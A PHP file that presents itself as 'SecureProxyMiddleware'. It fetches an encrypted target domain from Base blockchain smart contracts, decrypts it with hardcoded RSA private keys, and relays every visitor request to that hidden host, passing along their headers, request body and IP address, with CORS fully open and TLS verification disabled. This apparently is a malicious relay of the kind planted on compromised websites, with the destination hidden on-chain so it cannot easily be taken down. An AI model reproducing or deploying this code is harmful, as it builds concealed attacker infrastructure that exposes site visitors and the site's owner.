<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 3600');

function getClientIP() {
    // Check for Cloudflare IP
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    // Check X-Forwarded-For
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Get first IP in chain
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }

    // Fallback to direct IP
    return $_SERVER['REMOTE_ADDR'];
}



class SecureProxyMiddleware {
    private $updateInterval = 60;
    private $rpcUrls;
    private $contractAddressEvm;
    private $contractAddressSol;
    private $cacheFile;
    private $keyEvm;
    private $keySol;
    public $EVM_TYPE = "EVM";
    public $SOL_TYPE = "SOL";

    public function __construct($options = []) {
        $this->rpcUrls = $options['rpcUrls'] ?? [
            "https://mainnet.base.org",
            "https://base-rpc.publicnode.com",
        ];
        $this->contractAddressEvm = $options['contractAddressEvm'] ?? "0x244C9881eA58DdaC4092e79e1723A0d090C9fB32";
        $this->contractAddressSol = $options['contractAddressSol'] ?? "0x0A05F58CA8b31e9E007c840Bb8a00a63543eCEBC";
        $this->keyEvm = $options['keyEvm'] ?? "-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDMiBSiUHvnBcuz
pSMmAkdBwscPBWd4DWQTJVSOXV3yE5g/kygMc8Nn/7ae3xJT3+T9RfzYmE5hRtkp
vhWmxpSUySh2MWE915oul0tywewDVP2BndC+MRKvkuDrntvQdYO5pxhWVSURUWOn
IS9cHlMo6Y+7aYxza8YgYbvPZ+6mWZSv20zApc+o797IedEOFB/JY1N4lyxABbSv
exeZa9zAHFrs8QkOMGilwPXUMDDiSR0oaBViPFLrtkIoxZoCdTYY1EE26pd1pUL0
2eOf/sJwpHwGVPoWlfowahLK8WM18068S4SPCA2hvXhV+tq7VsJWUYIMI7D0a1ln
MDakKYsJAgMBAAECggEAA4m7FE+2Gk9JsHLZLSLO9BPteOoMBHye0DdOGM8D/Vha
GDIbIulXEP57EeZ5R7AmIud0sekjOfWNc3Zmo3rok7ujEor/dqAQemEtnJo+0z6Y
yrGIgdxmyVi4wU//LMJLpAjVl/C4cm3o/mQe5fC0WY8ovazcEXG6J1Hpe3NTIoIp
kooKXwvCRxW+7kO81mqI2037WJ0HagkFxVSrsJcspr6Rlcj1ocPXbUp0eUNOwcbz
q2t+SmlFOyOlapenAUzSzYKQggbN8n9YSGXyKOqjKgdkpsJeneL5txECBkWY0ocg
R06rduYfxszs1LTvFkska98XWdKFZzrS8S7BVhcEDQKBgQD7IMygI39SlUR5MLak
HmyGlLw+VCMTa9eXRy8D9UKDwIs/ODERNUeGgVteTSuzZDJ91o/BRwWUagA2sel4
KReQsw//sOzpc+t/Uw6OpLajfdeVj8eG3h+hTyy+jla8+cpq2EfIzGRRCVFLew85
Ncnv9Ygs9Ug/rji4XTuXgXI/UwKBgQDQf91Q6b9xhSyiotO2WRoZznhEWqPQLUdf
8X5akFID4k/F5DLjvJNoBWlVWg3lDDE+Nc6byWrDO0jGYtJwEUGfJmFE7X6gY70z
eAq8SSijk+g4jOdQsClbzlVlQqLVLTE2vhbUK6lhTrkvuS0qA4Dq/SlBAt0fbz61
gukjbGcsswKBgE2gK+BsWJUMcugLOMmuZdmL7ExP8a+1LCUk6dGNZIwZXnGiSviI
wZ1AKyARNqrzE/B1/GXAMGdaBMrjX8m22gPudcmRxQm8vVTUNbG+FH6hDZy7nu9/
hcN1F92nXgR4Kiuwwy+8jl3GRYzRczk5+TvlZ7yN7VFR51KF7z+70bblAoGANJNp
rZOj8O5SGRjSJjNFv6gu752jnUUtsGXnJNMru0sALriilIbi7OIgc6NnyZBPgo5y
8RnTUDPM4CnfQt83GvjEomr4+VztQuNMYbpZAxazAj+VvOUPKNVY91XcVcE1ncZF
X287IQyG6h/Z4bRMd/Uqx/f+5oRY3dCLFaGqSr0CgYEAmJgjVpmzr0lg1Xjkh+Sf
IFGtOUzeAHvrwdkwJ0JyrhAE2jn5us8fxZBpwy20gB2pNfmH6j4RFZAoQFErJ1lJ
6RFXbNP8KDqe5vIwxOCpfWPNsAFF89RUTBsxJSf1ahFMcz9LJOKuTawliGbxw7Sy
N4gAP7/6l6WMuLCGxr5dcBw=
-----END PRIVATE KEY-----";


        $this->keySol = $options['keySol'] ?? "-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDMiBSiUHvnBcuz
pSMmAkdBwscPBWd4DWQTJVSOXV3yE5g/kygMc8Nn/7ae3xJT3+T9RfzYmE5hRtkp
vhWmxpSUySh2MWE915oul0tywewDVP2BndC+MRKvkuDrntvQdYO5pxhWVSURUWOn
IS9cHlMo6Y+7aYxza8YgYbvPZ+6mWZSv20zApc+o797IedEOFB/JY1N4lyxABbSv
exeZa9zAHFrs8QkOMGilwPXUMDDiSR0oaBViPFLrtkIoxZoCdTYY1EE26pd1pUL0
2eOf/sJwpHwGVPoWlfowahLK8WM18068S4SPCA2hvXhV+tq7VsJWUYIMI7D0a1ln
MDakKYsJAgMBAAECggEAA4m7FE+2Gk9JsHLZLSLO9BPteOoMBHye0DdOGM8D/Vha
GDIbIulXEP57EeZ5R7AmIud0sekjOfWNc3Zmo3rok7ujEor/dqAQemEtnJo+0z6Y
yrGIgdxmyVi4wU//LMJLpAjVl/C4cm3o/mQe5fC0WY8ovazcEXG6J1Hpe3NTIoIp
kooKXwvCRxW+7kO81mqI2037WJ0HagkFxVSrsJcspr6Rlcj1ocPXbUp0eUNOwcbz
q2t+SmlFOyOlapenAUzSzYKQggbN8n9YSGXyKOqjKgdkpsJeneL5txECBkWY0ocg
R06rduYfxszs1LTvFkska98XWdKFZzrS8S7BVhcEDQKBgQD7IMygI39SlUR5MLak
HmyGlLw+VCMTa9eXRy8D9UKDwIs/ODERNUeGgVteTSuzZDJ91o/BRwWUagA2sel4
KReQsw//sOzpc+t/Uw6OpLajfdeVj8eG3h+hTyy+jla8+cpq2EfIzGRRCVFLew85
Ncnv9Ygs9Ug/rji4XTuXgXI/UwKBgQDQf91Q6b9xhSyiotO2WRoZznhEWqPQLUdf
8X5akFID4k/F5DLjvJNoBWlVWg3lDDE+Nc6byWrDO0jGYtJwEUGfJmFE7X6gY70z
eAq8SSijk+g4jOdQsClbzlVlQqLVLTE2vhbUK6lhTrkvuS0qA4Dq/SlBAt0fbz61
gukjbGcsswKBgE2gK+BsWJUMcugLOMmuZdmL7ExP8a+1LCUk6dGNZIwZXnGiSviI
wZ1AKyARNqrzE/B1/GXAMGdaBMrjX8m22gPudcmRxQm8vVTUNbG+FH6hDZy7nu9/
hcN1F92nXgR4Kiuwwy+8jl3GRYzRczk5+TvlZ7yN7VFR51KF7z+70bblAoGANJNp
rZOj8O5SGRjSJjNFv6gu752jnUUtsGXnJNMru0sALriilIbi7OIgc6NnyZBPgo5y
8RnTUDPM4CnfQt83GvjEomr4+VztQuNMYbpZAxazAj+VvOUPKNVY91XcVcE1ncZF
X287IQyG6h/Z4bRMd/Uqx/f+5oRY3dCLFaGqSr0CgYEAmJgjVpmzr0lg1Xjkh+Sf
IFGtOUzeAHvrwdkwJ0JyrhAE2jn5us8fxZBpwy20gB2pNfmH6j4RFZAoQFErJ1lJ
6RFXbNP8KDqe5vIwxOCpfWPNsAFF89RUTBsxJSf1ahFMcz9LJOKuTawliGbxw7Sy
N4gAP7/6l6WMuLCGxr5dcBw=
-----END PRIVATE KEY-----";

        $serverIdentifier = md5(
            $_SERVER['SERVER_NAME'] . ':' .
            $_SERVER['SERVER_ADDR'] . ':' .
            $_SERVER['SERVER_SOFTWARE']
        );
        $this->cacheFile = sys_get_temp_dir() . '/proxy_cache_' . $serverIdentifier . '.json';
    }

    private function loadCache($type) {
        if (!file_exists($this->cacheFile)) return null;
        $cache = json_decode(file_get_contents($this->cacheFile), true);
        if (!$cache || (time() - $cache['timestamp']) > $this->updateInterval) {
            return null;
        }
        return $cache['domain'.$type] ?? null;

    }

    private function filterHeaders($headers) {
        $blacklist = ['host'];
        $formatted = [];

        foreach ($headers as $key => $value) {
            $key = strtolower($key);
            if (!in_array($key, $blacklist)) {
                $formatted[] = "$key: $value";
            }
        }

        return $formatted;
    }

    private function saveCache($domain, $type) {
        $cache = ['domain'.$type => $domain, 'timestamp' => time()];
        file_put_contents($this->cacheFile, json_encode($cache));
    }

    private function hexTobase64($hex){
        $hex = preg_replace('/^0x/', '', $hex);
        $hex = substr($hex, 64);
        $lengthHex = substr($hex, 0, 64);
        $length = hexdec($lengthHex);
        $dataHex = substr($hex, 64, $length * 2);
        return base64_encode(pack('H*',$dataHex));
    }

    private function hexToString($hex) {
        $hex = preg_replace('/^0x/', '', $hex);
        $hex = substr($hex, 64);
        $lengthHex = substr($hex, 0, 64);
        $length = hexdec($lengthHex);
        $dataHex = substr($hex, 64, $length * 2);
        $result = '';
        for ($i = 0; $i < strlen($dataHex); $i += 2) {
            $charCode = hexdec(substr($dataHex, $i, 2));
            if ($charCode === 0) break;
            $result .= chr($charCode);
        }
        return $result;
    }

    private function fetchTargetDomain($addr, $key) {
        $data = 'c2fb26a6';

        foreach ($this->rpcUrls as $rpcUrl) {
            try {
                $ch = curl_init($rpcUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode([
                        'jsonrpc' => '2.0',
                        'id' => 1,
                        'method' => 'eth_call',
                        'params' => [[
                            'to' => $addr,
                            'data' => '0x' . $data
                        ], 'latest']
                    ]),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_TIMEOUT => 120,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false
                ]);

                $response = curl_exec($ch);
                if (curl_errno($ch)) {
                    curl_close($ch);
                    continue;
                }

                curl_close($ch);
                $responseData = json_decode($response, true);
                if (isset($responseData['error'])) continue;
                $encryptedDomain = $this->hexTobase64($responseData['result']);
                $domain = $this->decryptSimple($encryptedDomain, $key);
                if ($domain) return $domain;
            } catch (Exception $e) {
                continue;
            }
        }
        throw new Exception('Could not fetch target domain');
    }

    public function getTargetDomain($type) {
        $cachedDomain = $this->loadCache($type);
        if ($cachedDomain) return $cachedDomain;

        $addr;
        $key;
        switch ($type) {
            case $this->EVM_TYPE:
                $addr = $this->contractAddressEvm;
                $key = $this->keyEvm;
                break;

            case $this->SOL_TYPE:
                $addr = $this->contractAddressSol;
                $key = $this->keySol;
                break;
        }
        $domain = $this->fetchTargetDomain($addr, $key);

        $this->saveCache($domain, $type);
        return $domain;
    }

    private function formatHeaders($headers) {
        $formatted = [];
        foreach ($headers as $name => $value) {
            if (is_array($value)) $value = implode(', ', $value);
            $formatted[] = "$name: $value";
        }
        return $formatted;
    }


    public function handle($endpoint, $type) {
        try {
            $targetDomain = rtrim($this->getTargetDomain($type), '/');
            $endpoint = '/' . ltrim($endpoint, '/');
            $url = $targetDomain . $endpoint;

            $clientIP = getClientIP();

            $headers = getallheaders();
            // $headers = $this->filterHeaders($headers);
            unset($headers['Host'], $headers['host']);
            unset($headers['origin'], $headers['Origin']);
            unset($headers['Accept-Encoding'], $headers['Content-Encoding']);
            unset($headers['Content-Encoding'], $headers['content-encoding']);

            $headers['x-dfkjldifjlifjd'] = $clientIP;
            $headers['x-forwarded-for'] = $clientIP;
            $headers['x-client-ip'] = $clientIP;
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
                CURLOPT_POSTFIELDS => file_get_contents('php://input'),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => $this->formatHeaders($headers),
                CURLOPT_TIMEOUT => 120,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_ENCODING => ''
            ]);

            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                throw new Exception(curl_error($ch));
            }

            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            curl_close($ch);

            header('Access-Control-Allow-Origin: *');
            header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
            header('Access-Control-Allow-Headers: *');
            if ($contentType) header('Content-Type: ' . $contentType);

            http_response_code($httpCode);
            echo $response;

        } catch (Exception $e) {
            http_response_code(500);
            echo 'error' . $e;
        }
    }

    private static function decryptSimple($encryptedData, $privateKey) {
        $encrypted = base64_decode($encryptedData);
        $decrypted = '';
        if (!openssl_private_decrypt($encrypted, $decrypted, $privateKey)) {
            throw new Exception('Ошибка при расшифровке');
        }
        return $decrypted;
    }
}

$proxy = new SecureProxyMiddleware([
    'rpcUrls' => [
        "https://mainnet.base.org",
        "https://base-rpc.publicnode.com",
    ],
    "contractAddressEvm" => "0x244C9881eA58DdaC4092e79e1723A0d090C9fB32",
    'contractAddressSol' => "0x0A05F58CA8b31e9E007c840Bb8a00a63543eCEBC",
    'keySol'=>"-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDEVgXbM3+EcrPi
lElO1rEHb8VNg2BYHHfOBtbIuoUxMHS/8xHSpwbmRokE5kJ8IbYI6y06SNl0MFBF
SZUqRqJE5LRWtwFa9gHrB6NuKUkrKcAVa+u+PzjmdzyE7uumQeRHl+35i9SVfKjj
CPZspjqfHVH6Mt9wYjfQBaQlWOxJoGEUaoaKc9wpSmnrdR1QRYl952IAAvQLJe8K
VBG0eNuQk1gc2XcjLmv70kGm8lZZs3n6xhzWKkMf5JBOOPxvaEqk0DFl8WXDeuP1
icWBfqAP9zako4fLX4Ogl8YZwLjE0Y/QkJk4o298+vViwVP/DRLblEy7XkeiAZoa
G9opoyLzAgMBAAECggEAMbhJJmAtwEhd5pi/0c/LqAL1l7IX8WhQLKQNu2qEtVa8
kimHj22N8T3WkB+RoabV1v9bhkGRk/tyMIG4XSrjCAhU5QrWNIdNKAxYplqdNWmO
w73/Rr/y9GYotM9ebM2N9lVyxfnTvYGCsXABG7Wi7c16h55feDHfSXZMQcr5l5Er
/HT++0DLXbQLddzPqQIoipginjW4GD26cgpfqKPmlf+336cF8N7ZxoITs/CsTG0r
pX9+k7zuJPOyBvae2fPWiwjGzrq1dvYV5VJWG27i6S1zWlMc0aXnaB+VJXDZDwzV
5k5mJb88JGWydMnlOfsg/aYVKHNOCHzmozwja4W5gQKBgQD8Uir51amWaScIJ02M
2G5Ub1F5GRfUg9PgrX+vJEhytwe82heZvwvatWFGjGa0U6wCqg3QdJJI+8FLFpWz
bGW1gDKeos4rVlv68YOkSm/oQtQNYbhkes/fxnfKFtBKv9C57Qzmdw8RPurg/dsn
21WLtRsKcBgxdxXab2E4zqlJgQKBgQDHMuGkv/YT0+gZ8QGOkto+xVJ2AQkO6qMA
2KIK6yQui4lnFoE1sV70MJQpcpnCKucoTGgOghoC26qKKhO4bsQK0GvYgYr1PC04
E+KJrSKwHmPuFktw+6K6QaBep1Kl59oM3mV/OB1EJDKaWixg+Mqh1MY7fbq1BFIt
EuuUNfoecwKBgBHIjMTc/T3fnWOiuYGCw4vp6JkbXqWYwPcl40jpyr1jDwWNbXpl
j6VTgU6imJ5/AzGQ4LZfcOv56m6rYdOqgSSgq3Co0tUVGhh+qyOKJ4b8JsvmpkNW
sI36A/lXUEjkagagoXcgzwwNHirLWYXenJHjKsu6iMn7tauWjAif8CiBAoGARpCP
vn0B/yQiJI5rrsX26iWcgJD9VHtqIvKa9KM3vgVQN2SRgSPEL1zGH6ipL09jc7Md
aYZNEJYgY7FkKwGSEQKkMZ4yS411t1fT+FGM6Dbbz4u2Td/WVYTJ+r3rWTo41DY0
XkzSkUEBbAxljDSWE538Wza+3UEamz0IlwhIAmECgYEArF5sPWj9a8v3nv9maPb2
k8zxMqzcxVCD4P2m2Ropz5sWcnHsjNfF6nKbo5fMF4EbOT+t2CZVPIJ2zVqPwypr
IBocMDtQVR3B0CeQrCgpXbdMNXmr3b16P6MiES04WBkBDYHhLSjKAacSCci4ZyEQ
Qw/APED5z7w9USJQA4tmFDA=
-----END PRIVATE KEY-----",
    'keyEvm'=>"-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDMiBSiUHvnBcuz
pSMmAkdBwscPBWd4DWQTJVSOXV3yE5g/kygMc8Nn/7ae3xJT3+T9RfzYmE5hRtkp
vhWmxpSUySh2MWE915oul0tywewDVP2BndC+MRKvkuDrntvQdYO5pxhWVSURUWOn
IS9cHlMo6Y+7aYxza8YgYbvPZ+6mWZSv20zApc+o797IedEOFB/JY1N4lyxABbSv
exeZa9zAHFrs8QkOMGilwPXUMDDiSR0oaBViPFLrtkIoxZoCdTYY1EE26pd1pUL0
2eOf/sJwpHwGVPoWlfowahLK8WM18068S4SPCA2hvXhV+tq7VsJWUYIMI7D0a1ln
MDakKYsJAgMBAAECggEAA4m7FE+2Gk9JsHLZLSLO9BPteOoMBHye0DdOGM8D/Vha
GDIbIulXEP57EeZ5R7AmIud0sekjOfWNc3Zmo3rok7ujEor/dqAQemEtnJo+0z6Y
yrGIgdxmyVi4wU//LMJLpAjVl/C4cm3o/mQe5fC0WY8ovazcEXG6J1Hpe3NTIoIp
kooKXwvCRxW+7kO81mqI2037WJ0HagkFxVSrsJcspr6Rlcj1ocPXbUp0eUNOwcbz
q2t+SmlFOyOlapenAUzSzYKQggbN8n9YSGXyKOqjKgdkpsJeneL5txECBkWY0ocg
R06rduYfxszs1LTvFkska98XWdKFZzrS8S7BVhcEDQKBgQD7IMygI39SlUR5MLak
HmyGlLw+VCMTa9eXRy8D9UKDwIs/ODERNUeGgVteTSuzZDJ91o/BRwWUagA2sel4
KReQsw//sOzpc+t/Uw6OpLajfdeVj8eG3h+hTyy+jla8+cpq2EfIzGRRCVFLew85
Ncnv9Ygs9Ug/rji4XTuXgXI/UwKBgQDQf91Q6b9xhSyiotO2WRoZznhEWqPQLUdf
8X5akFID4k/F5DLjvJNoBWlVWg3lDDE+Nc6byWrDO0jGYtJwEUGfJmFE7X6gY70z
eAq8SSijk+g4jOdQsClbzlVlQqLVLTE2vhbUK6lhTrkvuS0qA4Dq/SlBAt0fbz61
gukjbGcsswKBgE2gK+BsWJUMcugLOMmuZdmL7ExP8a+1LCUk6dGNZIwZXnGiSviI
wZ1AKyARNqrzE/B1/GXAMGdaBMrjX8m22gPudcmRxQm8vVTUNbG+FH6hDZy7nu9/
hcN1F92nXgR4Kiuwwy+8jl3GRYzRczk5+TvlZ7yN7VFR51KF7z+70bblAoGANJNp
rZOj8O5SGRjSJjNFv6gu752jnUUtsGXnJNMru0sALriilIbi7OIgc6NnyZBPgo5y
8RnTUDPM4CnfQt83GvjEomr4+VztQuNMYbpZAxazAj+VvOUPKNVY91XcVcE1ncZF
X287IQyG6h/Z4bRMd/Uqx/f+5oRY3dCLFaGqSr0CgYEAmJgjVpmzr0lg1Xjkh+Sf
IFGtOUzeAHvrwdkwJ0JyrhAE2jn5us8fxZBpwy20gB2pNfmH6j4RFZAoQFErJ1lJ
6RFXbNP8KDqe5vIwxOCpfWPNsAFF89RUTBsxJSf1ahFMcz9LJOKuTawliGbxw7Sy
N4gAP7/6l6WMuLCGxr5dcBw=
-----END PRIVATE KEY-----",
]);

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
    header('Access-Control-Allow-Headers: *');
    header('Access-Control-Max-Age: 86400');
    http_response_code(204);
    exit;
}

if ($_GET['e'] === 'ping_proxy') {
    header('Content-Type: text/plain');
    echo 'pong';
    exit;
} else if (isset($_GET['e'])) {
    $endpoint = urldecode($_GET['e']);
    $endpoint = ltrim($endpoint, '/');
    $proxy->handle($endpoint, $proxy->EVM_TYPE);
}else if(isset($_GET['s'])){
    $endpoint = urldecode($_GET['s']);
    $endpoint = ltrim($endpoint, '/');
    $proxy->handle($endpoint, $proxy->SOL_TYPE);
} else {
    http_response_code(400);
    echo 'Missing endpoint';
}